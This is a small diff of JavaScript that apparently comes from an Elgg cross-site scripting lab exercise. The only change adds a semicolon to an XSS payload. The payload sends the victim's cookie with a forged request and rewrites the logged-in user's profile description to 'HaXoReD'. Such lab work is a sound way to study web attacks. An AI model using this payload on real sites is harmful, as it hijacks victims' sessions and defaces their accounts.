@@ -8,7 +8,7 @@ Ajax.setRequestHeader("Connection","keep-alive");
 Ajax.setRequestHeader("Cookie",document.cookie);
 Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
 var User=elgg.get_logged_in_user_entity();
-var name=User.name
+var name=User.name;
 var guid=elgg.get_logged_in_user_guid();
 var description="HaXoReD";
 var content="name="+name+"&description="+description+"&guid="+guid;
